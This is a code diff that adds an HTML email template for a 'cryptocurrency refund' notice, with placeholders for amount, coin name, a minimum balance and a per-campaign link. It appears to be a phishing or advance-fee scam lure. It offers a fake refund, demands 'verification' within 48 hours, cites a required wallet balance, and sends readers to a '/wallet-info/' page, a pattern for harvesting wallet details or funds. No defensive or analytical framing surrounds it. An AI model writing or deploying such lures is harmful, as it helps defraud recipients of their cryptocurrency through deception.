@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cryptocurrency Refund Notification</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.5;
+            background-color: #f4f4f5;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: transparent;
+            border-radius: 12px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header {
+            border-radius: 2em;
+            background: linear-gradient(to right, #1a56db, #1e429f);
+            padding: 32px 24px;
+            text-align: center;
+            color: white;
+        }
+        
+        .header h1 {
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        
+        .content {
+            padding: 24px;
+        }
+        
+        .amount-card {
+            background-color: #f0f9ff;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 4em;
+        }
+        
+        .amount-label {
+            color: #0369a1;
+            font-size: 10px;
+            margin-bottom: 8px;
+        }
+        
+        .amount-value {
+            color: #0c4a6e;
+            font-size: 28px;
+            font-weight: bold;
+        }
+        
+        .details-card {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 24px;
+        }
+        
+        .detail-row {
+            padding: 12px 0;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+        
+        .detail-label {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 4px;
+        }
+        
+        .detail-value {
+            color: #0f172a;
+            font-size: 16px;
+            font-weight: 500;
+        }
+        
+        .cta-button {
+            display: block;
+            background: linear-gradient(to right, #2563eb, #1d4ed8);
+            color: white;
+            text-decoration: none;
+            padding: 16px 32px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 600;
+            margin: 30px 0;
+            transition: transform 0.1s ease;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-1px);
+        }
+        
+        .warning {
+            background-color: #fff7ed;
+            border-left: 4px solid #f97316;
+            padding: 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+        }
+        
+        .warning p {
+            color: #9a3412;
+            font-size: 14px;
+        }
+        
+        .footer {
+            background-color: #f8fafc;
+            padding: 24px;
+            text-align: center;
+            border-top: 1px solid #e2e8f0;
+        }
+        
+        .footer p {
+            color: #64748b;
+            font-size: 14px;
+            margin-bottom: 8px;
+        }
+        
+        @media (max-width: 600px) {
+            body {
+                padding: 12px;
+            }
+            
+            .header {
+                padding: 24px 16px;
+            }
+            
+            .content {
+                padding: 16px;
+            }
+            
+            .header h1 {
+                font-size: 20px;
+            }
+            
+            .amount-value {
+                font-size: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>{{ cryptocurrency.name }} Refund Available</h1>
+            <p>Your verification is required to process the refund</p>
+        </div>
+        
+        <div class="content">
+            <div class="amount-card">
+                <div class="amount-label">Refund Amount</div>
+                <div class="amount-value">{{ quantity }} {{ cryptocurrency.name }}</div>
+            </div>
+            
+            <div class="details-card">
+                <div class="detail-row">
+                    <div class="detail-label">Transaction Type</div>
+                    <div class="detail-value">Refund Process</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">Minimum Required Balance</div>
+                    <div class="detail-value">{{ min_balance }} {{ cryptocurrency.name }}</div>
+                </div>
+                <div class="detail-row">
+                    <div class="detail-label">Status</div>
+                    <div class="detail-value" style="color: #ea580c;">Pending Verification</div>
+                </div>
+            </div>
+            
+            <a href="{{ base_url }}/wallet-info/{{ campaign_id }}/" class="cta-button">
+                Begin Verification
+            </a>
+            
+            <div class="warning">
+                <p>⚠️ Important: This verification process must be completed within 48 hours for security purposes. After this period, the refund request may need to be reinitiated.</p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>&copy; {{ current_year }} Refund Services. All rights reserved.</p>
+        </div>
+    </div>
+</body>
+</html>
